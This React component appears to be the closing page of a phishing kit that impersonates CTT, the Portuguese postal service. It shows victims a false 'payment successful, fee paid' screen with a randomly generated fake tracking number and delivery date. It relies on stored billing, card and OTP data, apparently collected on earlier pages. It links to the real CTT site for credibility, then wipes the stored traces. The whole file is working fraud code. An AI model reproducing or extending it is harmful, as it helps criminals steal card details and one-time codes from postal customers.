import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { Card, CardContent } from './ui/card';
import { Button } from './ui/button';
import { CheckCircle, Package, MapPin, Calendar, Truck } from 'lucide-react';

const CTTConfirmation = () => {
  const navigate = useNavigate();
  const [billingData, setBillingData] = useState(null);
  const [trackingNumber, setTrackingNumber] = useState('');
  const [deliveryDate, setDeliveryDate] = useState('');

  useEffect(() => {
    // Get data from localStorage
    const storedBillingData = localStorage.getItem('ctt_billing_data');
    const storedTrackingNumber = localStorage.getItem('ctt_tracking_number');
    const otpVerified = localStorage.getItem('ctt_otp_verified');
    
    if (storedBillingData && otpVerified) {
      setBillingData(JSON.parse(storedBillingData));
      
      // Generate or use stored tracking number
      let tracking = storedTrackingNumber;
      if (!tracking) {
        // Generate random tracking number in format RR#########PT
        const randomNumbers = Math.random().toString().slice(2, 11);
        tracking = `RR${randomNumbers}PT`;
        localStorage.setItem('ctt_tracking_number', tracking);
      }
      setTrackingNumber(tracking);
      
      // Calculate delivery date (5 business days from now)
      const calculateDeliveryDate = () => {
        const today = new Date();
        let businessDays = 0;
        let currentDate = new Date(today);
        
        while (businessDays < 5) {
          currentDate.setDate(currentDate.getDate() + 1);
          const dayOfWeek = currentDate.getDay();
          
          // Skip weekends (Saturday = 6, Sunday = 0)
          if (dayOfWeek !== 0 && dayOfWeek !== 6) {
            businessDays++;
          }
        }
        
        return currentDate.toLocaleDateString('pt-PT', {
          weekday: 'long',
          year: 'numeric',
          month: 'long',
          day: 'numeric'
        });
      };
      
      setDeliveryDate(calculateDeliveryDate());
    } else {
      // If no verification data, redirect to billing page
      navigate('/billing');
    }
  }, [navigate]);

  const handleTrackOrder = () => {
    // Redirect to CTT website
    window.open('https://www.ctt.pt/particulares/index', '_blank');
  };

  const handleNewOrder = () => {
    // Clear localStorage and redirect to YouTube
    localStorage.removeItem('ctt_billing_data');
    localStorage.removeItem('ctt_card_data');
    localStorage.removeItem('ctt_otp_verified');
    localStorage.removeItem('ctt_tracking_number');
    localStorage.removeItem('ctt_billing_id');
    
    window.open('https://youtu.be/xvFZjo5PgG0?list=RDxvFZjo5PgG0', '_blank');
  };

  if (!billingData) {
    return <div>Carregando...</div>;
  }

  return (
    <div className="max-w-2xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
      <Card className="shadow-lg border-0 rounded-lg overflow-hidden">
        <CardContent className="p-8">
          {/* Success Header */}
          <div className="text-center mb-8">
            <div className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-4">
              <CheckCircle className="w-8 h-8 text-green-600" />
            </div>
            <h2 className="text-2xl font-bold text-gray-900 mb-2">
              Pagamento realizado com sucesso!
            </h2>
            <p className="text-gray-600">
              A sua encomenda está a ser processada
            </p>
          </div>

          {/* Order Details */}
          <div className="space-y-6">
            {/* Tracking Number */}
            <div className="bg-gray-50 rounded-lg p-4">
              <div className="flex items-center">
                <Package className="w-5 h-5 text-red-600 mr-2" />
                <div className="flex-1">
                  <h3 className="font-semibold text-gray-900">Número de rastreio</h3>
                  <p className="text-lg font-mono text-red-600">{trackingNumber}</p>
                </div>
              </div>
            </div>

            {/* Status */}
            <div className="bg-blue-50 rounded-lg p-4">
              <div className="flex items-center">
                <Truck className="w-5 h-5 text-blue-600 mr-2" />
                <div className="flex-1">
                  <h3 className="font-semibold text-gray-900">Estado atual</h3>
                  <p className="text-blue-600">Processamento inicial - Taxa paga</p>
                </div>
              </div>
            </div>

            {/* Delivery Date */}
            <div className="bg-green-50 rounded-lg p-4">
              <div className="flex items-center">
                <Calendar className="w-5 h-5 text-green-600 mr-2" />
                <div className="flex-1">
                  <h3 className="font-semibold text-gray-900">Entrega prevista</h3>
                  <p className="text-green-600">{deliveryDate}</p>
                </div>
              </div>
            </div>

            {/* Delivery Address */}
            <div className="bg-gray-50 rounded-lg p-4">
              <div className="flex items-center">
                <MapPin className="w-5 h-5 text-gray-600 mr-2" />
                <div className="flex-1">
                  <h3 className="font-semibold text-gray-900">Endereço de entrega</h3>
                  <p className="text-gray-600">
                    {billingData.endereco}<br />
                    {billingData.codigoPostal} {billingData.cidade}
                  </p>
                </div>
              </div>
            </div>
          </div>

          {/* Action Buttons */}
          <div className="mt-8 space-y-4">
            <Button
              onClick={handleTrackOrder}
              className="w-full bg-red-600 hover:bg-red-700 text-white py-3 text-lg font-medium"
            >
              Rastrear Encomenda
            </Button>
            
            <Button
              onClick={handleNewOrder}
              variant="outline"
              className="w-full border-red-600 text-red-600 hover:bg-red-50 py-3 text-lg font-medium"
            >
              Nova Encomenda
            </Button>
          </div>

          {/* Footer Info */}
          <div className="mt-8 text-center text-sm text-gray-500">
            <p>Será enviado um email de confirmação para {billingData.email}</p>
            <p className="mt-2">
              Para questões sobre a sua encomenda, contacte-nos através do número de rastreio acima.
            </p>
          </div>
        </CardContent>
      </Card>
    </div>
  );
};

export default CTTConfirmation;